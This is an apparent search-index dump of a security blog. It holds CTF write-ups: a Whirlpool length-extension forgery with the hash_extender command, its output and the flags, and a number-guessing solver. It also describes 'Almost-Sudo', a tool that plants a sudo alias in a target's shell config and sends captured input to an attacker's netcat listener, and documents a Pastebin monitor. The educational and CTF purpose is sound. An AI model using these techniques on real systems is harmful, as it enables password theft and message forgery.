d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b \nUser-Agent: Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\nConnection: keep-alive\nAccept: text/html,application/xhtml\n\nbombing=true\nbananas=missing\naction=activate\nmonkeys=ontheway\n\n\n\n\n\nSolution\n\n\nWe received two files an HTTP request and the source code of the \"interruptor\" to defuse the bomb. \n\n\nThe HTTP request shows how this hacker team did the activation of the bomb. They basically sent a POST request to the host where this interruptor was hosted. The most important parts of it are: \n\n\n\n\nThe HTTP header \nTag\n\n\nThe body used. \n\n\n\n\nThe body has a parameter called \naction\n which seems to be the one that really activates the bomb. \n\n\nReading the pseudocode of the server, in particular the lines:\n\n\nif self.check_tag(tag, params):\n    params = parse_params(urllib.parse.unquote(params))\n    if params['action'] == 'activate':\n            activate_bomb()\n    elif params['action'] == 'defuse':\n            defuse_bomb()\n\n\n\n\nwe can confirm, that the \naction=activate\n is the necessary parameter to activate the bomb. Therefore, if we manage to send \naction=defuse\n we would be able to defuse it!. \n\n\nHowever  our problem is the check function \nself.check_tag(tag, params)\n. This function is taking as input, the \ntag\n header the parameters sent in the body and performs the following action:\n\n\ndef check_tag(self, tag, params):\n    decoded_params = urllib.parse.unquote_to_bytes(params)\n    return tag == remolino.new(self.mac_key+decoded_params).hexdigest()\n\n\n\n\nFirst, it makes some url-decoding and then it compares the sent \ntag\n against the result of applying a function call \nremolino.new\n to the concatenation of a key and the sent (and decoded) parameters. Then it calculates the \nhexdigest\n of it, which indicates that this function is potentially related to some hashing algorithm. \n\n\nThe key appended to the params, is partially known:\n\n\nself.mac_key = b\nTh1s1sS3cure4sH3ll\n + os.urandom(14)\n\n\n\n\nbut still there are 14 bytes (112 bits) that are random. So there's no chance we can bruteforce that. \n\n\nremolino\n its a library but we cannot know which one, cause:\n\n\n# NOOO! Alguien elimin\u00f3 esto!\nimport %%%%%% as remolino\n\n\n\n\nThis is clearly the structure of a \nMAC\n (in fact the name \nself.mac_key\n it's a little spoiler). \n\n\nThis means that if we want to send a message to the 'interruptor' we should also send the \ntag\n header with the value of applying the hash function to the parameters together with the key (that we don't have). Seems to be almost impossible. \n\n\nLet's try to guess which hashing algorithm they are using.\nFrom the example request, we can get the a valid \ntag\n: \n\n\nd293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b\n\n\n\n\nThis is the value of applying the hash function to \"\n\\\nkey>\n\"+\"\nbombing=true\nbananas=missing\naction=activate\nmonkeys=ontheway\n\"\n\n\nLet's how long this hash digest is:\n\n\nlen(\nd293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b\n)\n128\n\n\n\n\n128 bytes as an output it's pretty long. I think that the most famous algorithm which it digest is of 128 bytes is sha-512. \n\n\nIf you have a little background of crypto you may've already realize what you need to use here. If you lack of it, still, you may understand that you need to create a valid tag, but you need the MAC key for that, which seems to be impossible to retrieve. Unless there is another kind of attack to create a valid tag. \n\n\nThe \nlength extension attack\n is one of the most famous attacks known for hashes. It basically states that: \n\n\nIf in a structure like \nhash_function(secret+data) = H\n, you know:\n\n\n\n\nLength of  \nsecret\n\n\ndata\n\n\nH\n \n\n\n\n\nIt is possible to create \nH2\n which asserts that:\n\nhash_function(secret+data+data2) = H2\n with \ndata2\n being some arbitrary data you want to append. \n\n\nIn other words, knowing the previous hash value, the data that was used to hash and \nonly\n the length of the secret appended, you can append any arbitrary data and a valid hash without never knowing the actual value of the secret.\n\n\nHOW?! I won't explain the full details of it, for that you can visit something like this \nlink\n, or any other explaination of it. But in quick words this happens only in hashes that are based on some common techinique called Merkle\u2013Damg\u00e5rd. It basically divides the input in blocks and it process each block separately (it's really not separately because it has dependences of previous blocks). This technique has an internal state which is updated each time a new block is processed. The resulting hash value is the internal state after processing the final block. \nThe length extension attack leverages this and continues from the last \"checkpoint\" (which was the internal state of the final block) and adds more data to it. \n\n\nThe requirements of this attack seems to fit in our case, but we still have some issues:\n\n\n\n\nWe don't know yet the actual hash function that is being used\n\n\nWhat data should we append ?\n\n\n\n\nFor \n1.\n we can make a search in google to see what hashes are vulnerable to this attack (or are based in Merkle\u2013Damg\u00e5rd, which is the same) and also have a 128 bytes of digest. The answer to this is: \n\n\n\n\nSHA512\n\n\nWHIRPOOL\n\n\n\n\nWell at this moment we can continue with both algorithms doing the tests, but remember that parts?:\n\n\nimport %%%%%% as remolino\n...\nreturn tag == remolino.new(self.mac_key+decoded_params).hexdigest()\n...\n\n\n\n\n\"remolino\" in spanish means \"whirpool\", so most probably the actual hash used is whirpool. \n\n\nFor \n2.\n we would want to send something like \naction=defuse\n, but we can't just send the data we want, but we have to append it. \n\n\nHowever,  let's pay attention to the way the server reads the params:\n\n\ndef parse_params(self, body):\n    return dict(param_value.split(\n=\n) for param_value in body.split(\n))\n\n\n\n\nIt basically creates a dictionary and updates it with each key value gathered from the body. This means that this way is vulnerable to HPP (Parameter Polution). Therefore we can add our parameter to the end part of the body and when the server process it first will assing the value \nactivate\n to \naction\n but afterwards will overwrite this value with \ndefuse\n and BINGO!\n\n\nFortunately, we don't have to do all the forging (padding, etc) of the data we want to append. There are some tools that already exist and will make our life easier like \nhash extender\n. \n\n\nThis tool will do all the job for us:\n\n\n\n\n-d\n holds the data that was hashed previously\n\n\n-s\n has the hash value of it (the valid tag)\n\n\n-a\n holds the data we want to append\n\n\n-f\n is the name of the algorithm we want to use\n\n\n-l\n is the length of the secret\n\n\n\n\n./hash_extender -d \nbombing=true\nbananas=missing\naction=activate\nmonkeys=ontheway\n -s d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b -a \naction=defuse\n -f whirlpool -l 32 \nType: whirlpool\nSecret length: 32\nNew signature: f52a0a8b9899458985b7aad687763c5a4dd37d6ceebd49d131b92bd6416eba1781ffd31ba222d9a544d83a64f7c2b119262e58d576b5d645cae59d3dd352a09b\nNew string: 626f6d62696e673d747275652662616e616e61733d6d697373696e6726616374696f6e3d6163746976617465266d6f6e6b6579733d6f6e74686577617980000000000000000000000000000000000000000000000000000000000000000002e826616374696f6e3d646566757365\n\n\n\n\nWe now have the new signature for our new body \"bombing=true\nbananas=missing\naction=activate\nmonkeys=ontheway\naction=defuse\" which should be the way to defuse the bomb! \n\n\nIf we get the sha1 of this output, we finally get the correct flag\n\n\nONA{dcc78fb1416748d7f8eeb001342856e492cbd877}\n\n\n\n\nDISCLAIMER:\n This challenge was expecting to just append \"\naction=defuse\". In a real scenario if you add even more data after like \"\naction=defuse\nblabla=blabla\", it would have worked anyways.", 
            "title": "Defuse the bomb"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/#defuse-the-bomb", 
            "text": "", 
            "title": "Defuse the bomb"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/#description", 
            "text": "Category: Cryptography  Points:\u00a0250\u00a0/\u00a0500  Goal: Be aware of the Merkle\u2013Damg\u00e5rd weaskness, called Length Extension Attack.", 
            "title": "Description"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/#statement", 
            "text": "Un grupo apodado MonkeyBananas nos hacke\u00f3. En algun lado que no sabemos donde, dejaron una \"bomba\". No sabemos que hace esa \"bomba\", pero creemos que una vez que \"explote\" puede llegar a borrar todos los datos que tenemos almacenados en nuestros servidores. Necesitamos que nos ayudes a evitar que esto pase, tenemos s\u00f3lo 3 d\u00edas.   Claramente, nos est\u00e1n poniendo a prueba.. nos dieron el c\u00f3digo de un servidor que hace de \"Interruptor\". Si enviamos el request correcto a ese servidor vamos a poder desactivar la bomba, pero.. no parece tan facil ya que est\u00e1n usando alg\u00fan tipo de algoritmo criptogr\u00e1fico para evitar que puedas cambiar los par\u00e1metros del request a gusto. No est\u00e1 el c\u00f3digo completo del servidor que recibe dicho request, pero nos aseguraron que con lo que nos pasaron es suficiente.   De casualidad, uno de nuestros sistemas de defensa, pudo capturar el trafico de el request que hicieron ellos al interruptor para activar la alarma, espero que sirva de algo!  El flag es el SHA1 del TAG que deber\u00edas mandar para desactivar la bomba. \nSuerte!  ===========================================================  A group called MonkeyBananas hacked us. They left a \"bomb\" somewhere, but we don't know wehere. Furthermore, we don't know what this \"bomb\" does, but we believe that once it \"blows\" its gonna delete all data stored in our servers. We need your help, we have only 3 days.   Clearly, they're challenging us, due to they gave us the source code of a server which works as a \"switch\". If we send the correct request to that server we will be able to defuse the bomb, but... it doesn't seems that easy because they're using some kind of crypto algorithm to avoid arbitrary tampering the parameters. The source code is not complete, but they ensure us that in that file we have all we need.  Fortunately, one of our defense systems, was able to capture the request that this guys sent to the \"switch\" when they activated the bomb, hope this is useful!  The flag is the SHA1 of the TAG value you should submit in order to defuse the bomb.\nGood luck!", 
            "title": "Statement"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/#file", 
            "text": "These are the files that were provided by MonkeyBananas:  Server pseudocode  #!/usr/bin/env python3\nimport urllib\n# NOOO! Alguien elimin\u00f3 esto!\nimport %%%%%% as remolino\n\nclass Server:\n        def __init__(self):\n                ...\n                self.generate_mac_key()\n                ...\n\n        def generate_mac_key(self):\n                self.mac_key = b Th1s1sS3cure4sH3ll  + os.urandom(14)\n\n        def check_tag(self, tag, params):\n                decoded_params = urllib.parse.unquote_to_bytes(params)\n                return tag == remolino.new(self.mac_key+decoded_params).hexdigest()\n\n        def parse_params(self, body):\n                return dict(param_value.split( = ) for param_value in body.split( ))\n\n        def serve_for_ever(self):\n                ...\n\n        def doget(self, request):\n                ...\n\n        def dopost(self, request):\n                ...\n                ct = request.headers.get( Content-type )\n                if not form_urlencoded(ct.lower()):\n                        return error()\n                tag = request.headers.get( Tag )\n                params = request.body()\n                if self.check_tag(tag, params):\n                        params = parse_params(urllib.parse.unquote(params))\n                        if params['action'] == 'activate':\n                                activate_bomb()\n                        elif params['action'] == 'defuse':\n                                defuse_bomb()\n                        else:\n                                ....\n                else:\n                        return error()\n                ...\n        ...\nserver = Server()\nserver.serve_for_ever()  Request  POST /bombing HTTP/1.1\nHost: www.dibombjasbinplanted.com\nContent-Type: application/x-www-form-urlencoded\nTag: d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b \nUser-Agent: Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\nConnection: keep-alive\nAccept: text/html,application/xhtml\n\nbombing=true bananas=missing action=activate monkeys=ontheway", 
            "title": "File"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/#solution", 
            "text": "We received two files an HTTP request and the source code of the \"interruptor\" to defuse the bomb.   The HTTP request shows how this hacker team did the activation of the bomb. They basically sent a POST request to the host where this interruptor was hosted. The most important parts of it are:    The HTTP header  Tag  The body used.    The body has a parameter called  action  which seems to be the one that really activates the bomb.   Reading the pseudocode of the server, in particular the lines:  if self.check_tag(tag, params):\n    params = parse_params(urllib.parse.unquote(params))\n    if params['action'] == 'activate':\n            activate_bomb()\n    elif params['action'] == 'defuse':\n            defuse_bomb()  we can confirm, that the  action=activate  is the necessary parameter to activate the bomb. Therefore, if we manage to send  action=defuse  we would be able to defuse it!.   However  our problem is the check function  self.check_tag(tag, params) . This function is taking as input, the  tag  header the parameters sent in the body and performs the following action:  def check_tag(self, tag, params):\n    decoded_params = urllib.parse.unquote_to_bytes(params)\n    return tag == remolino.new(self.mac_key+decoded_params).hexdigest()  First, it makes some url-decoding and then it compares the sent  tag  against the result of applying a function call  remolino.new  to the concatenation of a key and the sent (and decoded) parameters. Then it calculates the  hexdigest  of it, which indicates that this function is potentially related to some hashing algorithm.   The key appended to the params, is partially known:  self.mac_key = b Th1s1sS3cure4sH3ll  + os.urandom(14)  but still there are 14 bytes (112 bits) that are random. So there's no chance we can bruteforce that.   remolino  its a library but we cannot know which one, cause:  # NOOO! Alguien elimin\u00f3 esto!\nimport %%%%%% as remolino  This is clearly the structure of a  MAC  (in fact the name  self.mac_key  it's a little spoiler).   This means that if we want to send a message to the 'interruptor' we should also send the  tag  header with the value of applying the hash function to the parameters together with the key (that we don't have). Seems to be almost impossible.   Let's try to guess which hashing algorithm they are using.\nFrom the example request, we can get the a valid  tag :   d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b  This is the value of applying the hash function to \" \\ key> \"+\" bombing=true bananas=missing action=activate monkeys=ontheway \"  Let's how long this hash digest is:  len( d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b )\n128  128 bytes as an output it's pretty long. I think that the most famous algorithm which it digest is of 128 bytes is sha-512.   If you have a little background of crypto you may've already realize what you need to use here. If you lack of it, still, you may understand that you need to create a valid tag, but you need the MAC key for that, which seems to be impossible to retrieve. Unless there is another kind of attack to create a valid tag.   The  length extension attack  is one of the most famous attacks known for hashes. It basically states that:   If in a structure like  hash_function(secret+data) = H , you know:   Length of   secret  data  H     It is possible to create  H2  which asserts that: hash_function(secret+data+data2) = H2  with  data2  being some arbitrary data you want to append.   In other words, knowing the previous hash value, the data that was used to hash and  only  the length of the secret appended, you can append any arbitrary data and a valid hash without never knowing the actual value of the secret.  HOW?! I won't explain the full details of it, for that you can visit something like this  link , or any other explaination of it. But in quick words this happens only in hashes that are based on some common techinique called Merkle\u2013Damg\u00e5rd. It basically divides the input in blocks and it process each block separately (it's really not separately because it has dependences of previous blocks). This technique has an internal state which is updated each time a new block is processed. The resulting hash value is the internal state after processing the final block. \nThe length extension attack leverages this and continues from the last \"checkpoint\" (which was the internal state of the final block) and adds more data to it.   The requirements of this attack seems to fit in our case, but we still have some issues:   We don't know yet the actual hash function that is being used  What data should we append ?   For  1.  we can make a search in google to see what hashes are vulnerable to this attack (or are based in Merkle\u2013Damg\u00e5rd, which is the same) and also have a 128 bytes of digest. The answer to this is:    SHA512  WHIRPOOL   Well at this moment we can continue with both algorithms doing the tests, but remember that parts?:  import %%%%%% as remolino\n...\nreturn tag == remolino.new(self.mac_key+decoded_params).hexdigest()\n...  \"remolino\" in spanish means \"whirpool\", so most probably the actual hash used is whirpool.   For  2.  we would want to send something like  action=defuse , but we can't just send the data we want, but we have to append it.   However,  let's pay attention to the way the server reads the params:  def parse_params(self, body):\n    return dict(param_value.split( = ) for param_value in body.split( ))  It basically creates a dictionary and updates it with each key value gathered from the body. This means that this way is vulnerable to HPP (Parameter Polution). Therefore we can add our parameter to the end part of the body and when the server process it first will assing the value  activate  to  action  but afterwards will overwrite this value with  defuse  and BINGO!  Fortunately, we don't have to do all the forging (padding, etc) of the data we want to append. There are some tools that already exist and will make our life easier like  hash extender .   This tool will do all the job for us:   -d  holds the data that was hashed previously  -s  has the hash value of it (the valid tag)  -a  holds the data we want to append  -f  is the name of the algorithm we want to use  -l  is the length of the secret   ./hash_extender -d  bombing=true bananas=missing action=activate monkeys=ontheway  -s d293e656353386647bef31070414e85dee1b35d8e3a2237f330277b824679b9955c086247a148295ba9df68f763b31dded09475da0fd5cd5bfbed0a29562f06b -a  action=defuse  -f whirlpool -l 32 \nType: whirlpool\nSecret length: 32\nNew signature: f52a0a8b9899458985b7aad687763c5a4dd37d6ceebd49d131b92bd6416eba1781ffd31ba222d9a544d83a64f7c2b119262e58d576b5d645cae59d3dd352a09b\nNew string: 626f6d62696e673d747275652662616e616e61733d6d697373696e6726616374696f6e3d6163746976617465266d6f6e6b6579733d6f6e74686577617980000000000000000000000000000000000000000000000000000000000000000002e826616374696f6e3d646566757365  We now have the new signature for our new body \"bombing=true bananas=missing action=activate monkeys=ontheway action=defuse\" which should be the way to defuse the bomb!   If we get the sha1 of this output, we finally get the correct flag  ONA{dcc78fb1416748d7f8eeb001342856e492cbd877}  DISCLAIMER:  This challenge was expecting to just append \" action=defuse\". In a real scenario if you add even more data after like \" action=defuse blabla=blabla\", it would have worked anyways.", 
            "title": "Solution"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/", 
            "text": "Guess my number\n\n\nDescription\n\n\n\n\nCategory: Programming\n\n\nPoints: 250/\u00a0500\n\n\nGoal: Fun, coding and a little bit about probabilties.\n\n\n\n\nStatement\n\n\nLet's play a game :).\nI will pick a number of 5 digits without telling you which one it is. You'll have to guess it in 4 or less attempts. \nEach attempt you make will have answer. This answer will be two numbers: X Y \n\n\nX is the amount of good digits\nY is the amount of regular digits. \n\n\nA good digit means that you have correctly guessed the position of a digit. \nA regular digit means that a digit of your guess is inside the number that was chosen but is not in the correct place.\n\n\nFor example: If the number chosen is 91246 and your attempt is 12345, the answer will be: 1 2. Why? \n1 good because the digit 4 is inside the number and also in the correct place\n2 regulars because the digits 1 and 2 are in the number, but in diffrent positions than the ones attempted.\n\n\nGood luck !\n\n\n===\n\n\nJuguemos un juego :)\nVoy a elegir un n\u00famero de 5 cifras sin dec\u00edrte cual es. Vos vas a tener que adivinarlo en 4 o menos intentos. \nCada intento tendr\u00e1 una respuesta. Dicha respuesta estar\u00e1 compuesta por dos n\u00fameros: X Y \n\n\nX ser\u00e1 la cantidad de d\u00edgitos que est\u00e1n bien\nY ser\u00e1 la cantidad de d\u00edgitos que est\u00e1n regular\n\n\nPor ejemplo: Si el n\u00famero elegido es 91246 y tu intento es 12345, la respuesta ser\u00e1: 1 2. \u00bfPor qu\u00e9?\n1 bien porque el d\u00edgito 4 est\u00e1 dentro del n\u00famero elegido y adem\u00e1s en la posici\u00f3n correcta. \n2 regulares porque los d\u00edgitos 1 y 2 est\u00e1n dentro del n\u00famero pero en posiciones incorrectas.\n\n\nBuena suerte!\n\n\nnc 198.211.123.92 1337\n\n\nFile\n\n\nThis was hosted in a particular server which may not be available for ever. Therefore, here is the actual server-side code.\n\n\nserver side code\n\n\nSolution\n\n\nI used to play this game when I was younger and I always found it very funny.\nThe idea here wasn't to hack anything but rather create a real solver for this game, which shouldn't take too much time. \n\n\nThe server had some constraints like: \n\n\n\n\nThe socket has 10 seconds of timeout\n\n\nYou cannot have more than 10 connections from the same IP\n\n\nYou have only 4 attempts to guess the number, otherwise the connection is closed.\n\n\nEach time a new connection is performed, a new random number of 5 digits is selected.\n\n\nEach time an attempt was submitted, the server will perform a 5 seconds sleep. \n\n\nMaximun amount of valid/invalid attempts is 100!\n\n\n\n\nMy idea was to force as much as possible, to develop their own solvers. Trying to bypass all of these constraints. \n\n\nThere is not much to say in this challenge but some tricks that I thought at the moment of solving it:\n\n\n\n\nDo to the timeout is 10 seconds if you have to process something that may take to more than that, you can just send an \"invalid format\" message. Therefore you will not waste a valid attempt one, but you will be \"refreshing\" the timeout. However, be you should do this carefully because you have also a limitation of 100 attempts either valid or invalid.\n\n\nYour solution won't guarantee you to always guess the number in 4 or less attempts. But the probability in answering correctly in less than 100 connections with a naive solver, should be high enough.\n\n\nYou can split this in 10 processes (10 different connections at a time) and therefore speed up your chances of winning.\n\n\n\n\nHere is the \nsolver\n I've developed.\n\n\nFinally the flag was: \n\n\nONA{861c4f67e887dec85292d36ab05cd7a1a7275228}", 
            "title": "Guess my number"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/#guess-my-number", 
            "text": "", 
            "title": "Guess my number"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/#description", 
            "text": "Category: Programming  Points: 250/\u00a0500  Goal: Fun, coding and a little bit about probabilties.", 
            "title": "Description"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/#statement", 
            "text": "Let's play a game :).\nI will pick a number of 5 digits without telling you which one it is. You'll have to guess it in 4 or less attempts. \nEach attempt you make will have answer. This answer will be two numbers: X Y   X is the amount of good digits\nY is the amount of regular digits.   A good digit means that you have correctly guessed the position of a digit. \nA regular digit means that a digit of your guess is inside the number that was chosen but is not in the correct place.  For example: If the number chosen is 91246 and your attempt is 12345, the answer will be: 1 2. Why? \n1 good because the digit 4 is inside the number and also in the correct place\n2 regulars because the digits 1 and 2 are in the number, but in diffrent positions than the ones attempted.  Good luck !  ===  Juguemos un juego :)\nVoy a elegir un n\u00famero de 5 cifras sin dec\u00edrte cual es. Vos vas a tener que adivinarlo en 4 o menos intentos. \nCada intento tendr\u00e1 una respuesta. Dicha respuesta estar\u00e1 compuesta por dos n\u00fameros: X Y   X ser\u00e1 la cantidad de d\u00edgitos que est\u00e1n bien\nY ser\u00e1 la cantidad de d\u00edgitos que est\u00e1n regular  Por ejemplo: Si el n\u00famero elegido es 91246 y tu intento es 12345, la respuesta ser\u00e1: 1 2. \u00bfPor qu\u00e9?\n1 bien porque el d\u00edgito 4 est\u00e1 dentro del n\u00famero elegido y adem\u00e1s en la posici\u00f3n correcta. \n2 regulares porque los d\u00edgitos 1 y 2 est\u00e1n dentro del n\u00famero pero en posiciones incorrectas.  Buena suerte!  nc 198.211.123.92 1337", 
            "title": "Statement"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/#file", 
            "text": "This was hosted in a particular server which may not be available for ever. Therefore, here is the actual server-side code.  server side code", 
            "title": "File"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/#solution", 
            "text": "I used to play this game when I was younger and I always found it very funny.\nThe idea here wasn't to hack anything but rather create a real solver for this game, which shouldn't take too much time.   The server had some constraints like:    The socket has 10 seconds of timeout  You cannot have more than 10 connections from the same IP  You have only 4 attempts to guess the number, otherwise the connection is closed.  Each time a new connection is performed, a new random number of 5 digits is selected.  Each time an attempt was submitted, the server will perform a 5 seconds sleep.   Maximun amount of valid/invalid attempts is 100!   My idea was to force as much as possible, to develop their own solvers. Trying to bypass all of these constraints.   There is not much to say in this challenge but some tricks that I thought at the moment of solving it:   Do to the timeout is 10 seconds if you have to process something that may take to more than that, you can just send an \"invalid format\" message. Therefore you will not waste a valid attempt one, but you will be \"refreshing\" the timeout. However, be you should do this carefully because you have also a limitation of 100 attempts either valid or invalid.  Your solution won't guarantee you to always guess the number in 4 or less attempts. But the probability in answering correctly in less than 100 connections with a naive solver, should be high enough.  You can split this in 10 processes (10 different connections at a time) and therefore speed up your chances of winning.   Here is the  solver  I've developed.  Finally the flag was:   ONA{861c4f67e887dec85292d36ab05cd7a1a7275228}", 
            "title": "Solution"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/", 
            "text": "Almost-Sudo\n\n\nDisclaimer\n\n\nThis tiny script which performs an temporary sudo-alias was developed just with awareness and educational intentions.\nWas tested in Ubuntu environments, using either BASH or ZSH shells.\n\n\nRequirements\n\n\n\n\nAccess to a user shell (Most likely to a sudoer user)\n\n\nGPG, netcat installed.\n\n\nNetwork access to shared server.\n\n\nPublic PGP-key server in the HTTP Server need to be called \"pentesting_issues.pdf\" (hardcoded)\n\n\n\n\nSteps to use it\n\n\n\n\nCreate a pgp-pair key. \n\n\nLog in to a shared server (between the target and yourself)\n\n\nSet an HTTP-Server hosting the public PGP key at port 6666. (Right know is hardcoded, could be changed, but I don't think is necessary)\n\n\nSet an Netcat-Server receiving connections at port 6667, logging all data received to a file. \n\n\nRun the script providing the ip/host of the shared server, inside the target machine.\n\n\nConnect to the shared server and get the logging file from the NC sever.\n\n\nDecript the file using the private PGP key.\n\n\n\n\nFuture work\n\n\nEvery feedback/help will be very welcome.\n\n\n\n\nDelete temp directory.\n\n\nRemove public key from keyring.\n\n\nMore..\n\n\n\n\nIn depth description\n\n\nThe bash script can be found \nhere\n.\n\n\nIn order to ease the explaniation it is divided in different parts: \n\n\n\n\nChecks of parameters and more stuff\n\n\nPath and files configurations\n\n\nGetting information required\n\n\nScript creation\n\n\nCreating backup and giving rights to the script to execute\n\n\nWriting in the shellrc (sudo alias) and status variable", 
            "title": "Almost sudo"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/#almost-sudo", 
            "text": "", 
            "title": "Almost-Sudo"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/#disclaimer", 
            "text": "This tiny script which performs an temporary sudo-alias was developed just with awareness and educational intentions.\nWas tested in Ubuntu environments, using either BASH or ZSH shells.", 
            "title": "Disclaimer"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/#requirements", 
            "text": "Access to a user shell (Most likely to a sudoer user)  GPG, netcat installed.  Network access to shared server.  Public PGP-key server in the HTTP Server need to be called \"pentesting_issues.pdf\" (hardcoded)", 
            "title": "Requirements"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/#steps-to-use-it", 
            "text": "Create a pgp-pair key.   Log in to a shared server (between the target and yourself)  Set an HTTP-Server hosting the public PGP key at port 6666. (Right know is hardcoded, could be changed, but I don't think is necessary)  Set an Netcat-Server receiving connections at port 6667, logging all data received to a file.   Run the script providing the ip/host of the shared server, inside the target machine.  Connect to the shared server and get the logging file from the NC sever.  Decript the file using the private PGP key.", 
            "title": "Steps to use it"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/#future-work", 
            "text": "Every feedback/help will be very welcome.   Delete temp directory.  Remove public key from keyring.  More..", 
            "title": "Future work"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/#in-depth-description", 
            "text": "The bash script can be found  here .  In order to ease the explaniation it is divided in different parts:    Checks of parameters and more stuff  Path and files configurations  Getting information required  Script creation  Creating backup and giving rights to the script to execute  Writing in the shellrc (sudo alias) and status variable", 
            "title": "In depth description"
        }, 
        {
            "location": "/tiny_tools/pastemon/", 
            "text": "Pastemon\n\n\nDescription\n\n\nPastemon is a python3-based multiprocess framework aim to allow you monitor the public pastebins that are continuously uploaded to https://pastebin.com.\nIt allows you to match content inside the pastes based on rules written by the user. So far, you are able to match fixed strings or regexes. If some of the rules defined matches, the entire pastebin is stored.\n\n\nVery interesting stuff can be found. Start thining on cool regexes ;). \n\n\nSourcecode\n\n\nThe source code can be find in https://github.com/lmkalg/pastemon\n\n\nRequirements\n\n\nPastemon makes use of the \nscrapping interface\n provided by Pastebin. In order to use it, you should whitelist your IP. Therefore, to use Pastemon, you should have a PRO account in Pastebin, otherwise your IP will be blocked after a few seconds. \n\n\nThe necessary libraries in order to run this tool, are written down in the \nrequirements.txt\n.\n\n\nInstall\n\n\nTo install the tools and necessary libraries, it's recommended to use a particular virtual env: \n\n\nvirtualenv pastemon -p python3\nsource pastemon/bin/activate\ncd pastemon\npip install -r requirements.txt\npython pastemon.py ARGUMENTS\n\n\n\n\nHow to use it\n\n\nusage: pastemon.py [-h] [-d DOWNLOADERS] [-g GETTERS] [-a ANALYZERS]\n                          [-s STORERS] [-r ANALYSIS_DIR_PATH]\n                          [-o OUTPUT_DIR_PATH] [-c CONDITIONS_FILE_PATH]\n                          [-t TIME_TO_WAIT] [-n AMOUNT_OF_PASTES_TO_FETCH]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -d DOWNLOADERS        Amount of downloaders (will download the pastebin\n                        content)\n  -g GETTERS            Amount of getters (will check for new pastebins)\n  -a ANALYZERS          Amount of analyzers (will analyze the pastebin's\n                        content)\n  -s STORERS            Amount of storers (will either store or delete a\n                        pastebin)\n  -r ANALYSIS_DIR_PATH  Path to store the pastes to be analyzed (temporary)\n  -o OUTPUT_DIR_PATH    Path to store the pastes that accomplished some\n                        condition\n  -c CONDITIONS_FILE_PATH\n                        Path to the YAML conditions file\n  -t TIME_TO_WAIT       Amount of time (in secs) to wait between each time it\n                        goes for new pastes. Suggested and default (180)\n  -n AMOUNT_OF_PASTES_TO_FETCH\n                        Amount of pastes to fetch each time it goes for new\n                        pastes. Maximun and default is 250\n\n\n\n\nHow does it work\n\n\nIf you are interested in the full architecture of the tool, here you'll find a detailed description:\n\n\n\nAs it is depicted in the picture, there are several components involves in the framework: \n\n \nPastebin Server\n: This is the only thing that is not controlled by the user. It represents the host where the pastebins are uploaded. \n\n \nRedis\n: A \nredis\n instance with couple of queues to deal with the async between several processes.\n\n \nStorage\n: This is any storage chosen by the user, used to store each pastebin either temporary or definitively (if it matches some rule).\n\n \nPastebin Monitor\n: The actual and initial Python script (pastemon.py) which received the arguments to configure the whole tool.\n\n \nConditions definition file\n: A \n.yaml\n file where the rules/conditions are defined.\n\n \nOrchestrator\n: Naive Python object in charge of initializing the rest objects and validating the input. \n\n \nGetters\n: Python objects in charge of pulling ONLY the new pastes (if there are) and pushing the data related to them (URL, name, etc) to the \nPastes data queue\n.\n\n \nDownloaders\n: Python objects in charge of pulling the corresponding data of each new pastebin from the \npastes data queue\n, to later download the actual content of each of them. Once the contest is downloaded, it is stored in the \nStorage\n (in particular in the \nAnalysis Directory\n, flag \n-r\n), the related info (path to the storage) is pushed to the \nPastes to analyze queue\n.\n\nAnalyzers\n: Python objects in charge of analyzing the actual content (after getting the path \nfrom the \nPastes to analyze queue\n). If there is rule that matches, the path to it togeteher with the action that should be carried out (either store it or delete it) is pushed to the \nStorers queue\n.\n\nStorers\n: Python objects in charge of either deleting the patebins that didn't match or moving them in the corresponding directory. For each condition/rule defined a directory, inside the output directory provided as parameter, is created.\n\n\nDefining rules / conditions\n\n\nIn order to write new rules/conditions to be matched, a \n.yaml\n file with the following structure should be provided:\n\n\n[cond1]:\n    [match_cond_1_1]\n    [match_cond_1_2]\n    ...\n\n[cond2]:\n    [match_cond_2_1]\n    [match_cond_2_2]\n    ...\n...\n[condn]:\n    [match_cond_n_1]\n    [match_cond_n_2]\n    ...\n\n\n\n\n\n\n[condX]\n: Will be used as the name of the rule/condition, therefore it will exist a directory with this name where all the matched pastebins will be placed.\n\n\n[match_cond_X_Y]\n: WIll be each of the 